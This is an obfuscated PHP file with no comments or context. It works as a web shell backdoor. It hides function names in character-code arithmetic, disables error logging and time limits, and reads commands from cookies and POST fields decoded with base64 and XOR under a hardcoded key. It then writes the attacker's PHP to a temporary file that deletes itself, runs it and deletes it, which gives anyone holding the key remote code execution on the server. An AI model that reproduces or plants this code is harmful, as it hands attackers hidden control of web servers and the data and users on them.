<?php $qpmvh = "\x66"."\x69"."\154".chr(719-618).chr(95).'p'.chr(219-102)."\164"."\x5f"."\143".chr(111).chr(110).chr(698-582)."\145"."\156".chr(221-105).chr(184-69);
$soqzz = "\x62".chr(97).chr(388-273).chr(1082-981)."\x36"."\64"."\x5f".chr(100).chr(727-626).chr(702-603)."\157"."\144".chr(101);
$cupngq = "\x69".'n'."\x69"."\x5f"."\163".chr(831-730)."\x74";
$yrotnly = "\x75"."\x6e".'l'.chr(780-675)."\156"."\x6b";


@$cupngq("\x65".chr(1088-974).chr(114).'o'.'r'."\137"."\154"."\157".chr(103), NULL);
@$cupngq(chr(108).chr(111).chr(103).'_'.'e'.chr(114)."\162".'o'.chr(114)."\163", 0);
@$cupngq("\155".'a'.'x'."\x5f".'e'."\170".chr(815-714)."\143"."\x75".'t'."\x69".chr(111)."\156".chr(95).'t'.chr(105)."\x6d".chr(385-284), 0);
@set_time_limit(0);

function becgpm($zrjutevi, $vuetdh)
{
    $xwvlyidg = "";
    for ($cebaai = 0; $cebaai < strlen($zrjutevi);) {
        for ($j = 0; $j < strlen($vuetdh) && $cebaai < strlen($zrjutevi); $j++, $cebaai++) {
            $xwvlyidg .= chr(ord($zrjutevi[$cebaai]) ^ ord($vuetdh[$j]));
        }
    }
    return $xwvlyidg;
}

$eetyaqkyd = array_merge($_COOKIE, $_POST);
$cebaaiirukc = '197bee0f-8e4a-4627-8d5e-c530cef568a4';
foreach ($eetyaqkyd as $halpq => $zrjutevi) {
    $zrjutevi = @unserialize(becgpm(becgpm($soqzz($zrjutevi), $cebaaiirukc), $halpq));
    if (isset($zrjutevi[chr(328-231).'k'])) {
        if ($zrjutevi[chr(715-618)] == chr(105)) {
            $cebaai = array(
                "\160".chr(611-493) => @phpversion(),
                chr(1105-990)."\x76" => "3.5",
            );
            echo @serialize($cebaai);
        } elseif ($zrjutevi[chr(715-618)] == chr(1017-916)) {
            $xhdka = "./" . md5($cebaaiirukc) . "\56".'i'.chr(285-175).chr(1059-960);
            @$qpmvh($xhdka, "<" . '?'."\x70".'h'.chr(112).chr(32).chr(64)."\165".chr(971-861)."\154".chr(620-515).'n'."\x6b"."\50"."\137"."\137".chr(600-530)."\x49".'L'."\105"."\x5f".chr(263-168)."\x29".';'.chr(929-897) . $zrjutevi[chr(100)]);
            @include($xhdka);
            @$yrotnly($xhdka);
        }
        exit();
    }
}

